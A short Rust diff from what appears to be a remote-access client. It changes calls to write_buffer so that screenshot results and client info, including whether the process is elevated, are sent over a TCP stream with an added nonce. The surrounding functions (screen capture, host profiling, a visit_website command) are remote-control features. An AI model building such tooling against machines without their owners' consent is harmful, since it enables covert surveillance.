@@ -44,7 +44,12 @@ pub fn take_screenshot(write_stream: &mut TcpStream, display: i32, secret: &Opti
         .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
         .expect("Couldn't write image to bytes.");
 
-    write_buffer(write_stream, Command::ScreenshotResult(bytes), secret);
+    write_buffer(
+        write_stream,
+        Command::ScreenshotResult(bytes),
+        secret,
+        crate::NONCE_WRITE.lock().unwrap().as_mut()
+    );
 }
 
 pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
@@ -119,7 +124,12 @@ pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
         is_elevated: is_elevated(),
     };
 
-    write_buffer(write_stream, Command::Client(client_data), secret);
+    write_buffer(
+        write_stream,
+        Command::Client(client_data),
+        secret,
+        crate::NONCE_WRITE.lock().unwrap().as_mut()
+    );
 }
 
 pub fn visit_website(
